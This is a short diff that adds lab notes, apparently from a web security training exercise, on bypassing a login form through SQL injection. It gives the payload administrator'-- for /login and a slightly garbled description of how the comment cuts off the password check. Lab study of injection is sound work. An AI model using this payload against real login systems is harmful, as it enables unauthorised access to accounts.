@@ -1,0 +1,4 @@
+Lab: SQL injection login bypass
+Payload: administrator'--
+URL: /login
+Description: --  password check then comment and login as admin
